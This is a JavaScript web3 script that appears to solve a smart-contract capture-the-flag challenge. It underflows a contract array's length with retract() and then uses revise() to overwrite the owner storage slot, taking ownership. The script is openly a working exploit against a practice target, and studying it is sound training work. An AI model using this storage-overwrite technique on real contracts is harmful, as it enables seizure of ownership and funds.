const { web3 } = require('../utils/getWeb3');

const { getAccounts,
    encodeMethodIdWithParameters,
    sendTransaction,
    valueFromLogs,
    storageLoop } = require('../utils/helpers');

const mainAddress = "0xf912de5f8d0dac8ca70c9f4a0d460950e9537850";

const checkLength = (data, check) => {
    if (data.length !== check) {
        throw new Error(`Length should be ${check}`);
    }
    return true;
}

const getTargetIndex = () => {
    const index = '0x' + '0'.repeat(63) + 1;
    checkLength(index, 66);
    const hashIndex = web3.utils.keccak256(index);
    const hashKey = BigInt(hashIndex.toString(10));
    const evmSize = BigInt(2 ** 256) - 1n;
    const targetIndex = evmSize - hashKey + 1n;
    return targetIndex.toString(10);
}

const createInstance = async () => {
    const account = await getAccounts(0)
    console.log("deplyoing....")
    const payload = "0xdfc86b17000000000000000000000000f0d6f7da4ed4ff54761841e497f5afc795f04688";
    checkLength(payload, 74);
    return sendTransaction(payload, mainAddress, account);
}

const initHack = async (instanceAddress) => {
    const account = await getAccounts(0)
    console.log('initalising hacking..');
    console.log('calling make_contact method...');
    let payload = web3.eth.abi.encodeFunctionSignature("make_contact()");

    return sendTransaction(payload, instanceAddress, account)
        .then((receipt) => {
            console.log('calling retract() method...');
            payload = web3.eth.abi.encodeFunctionSignature("retract()")
            return sendTransaction(payload, instanceAddress, account);
        })
        .then((receipt) => {
            console.log('calling revise() method...');
            const targetIndex = getTargetIndex();
            const owner32 = '0x' + '0'.repeat('24') + account.slice(2);
            checkLength(owner32, 66);
            payload = encodeMethodIdWithParameters(
                "revise(uint256,bytes32)",
                ['uint256', 'bytes32'],
                [targetIndex, owner32]
            );
            return sendTransaction(payload, instanceAddress, account);
        });
}

const submitInstance = async (instanceAddress) => {
    console.log('Submitting instance...');
    console.log('instanceAddress', instanceAddress);
    const methodId = '0xc882d7c2';
    const payload = methodId + '0'.repeat(24) + instanceAddress.slice(2);
    checkLength(payload, 74);
    const account = await getAccounts(0);
    return sendTransaction(payload, mainAddress, account);
}

createInstance()
    .then((receipt) => {
        const instanceAddress = valueFromLogs(receipt, 'address');
        return initHack(instanceAddress);
    }).then((receipt) => {
        const instanceAddress = receipt['to'];
        return submitInstance(instanceAddress);
    }).then(console.log);

  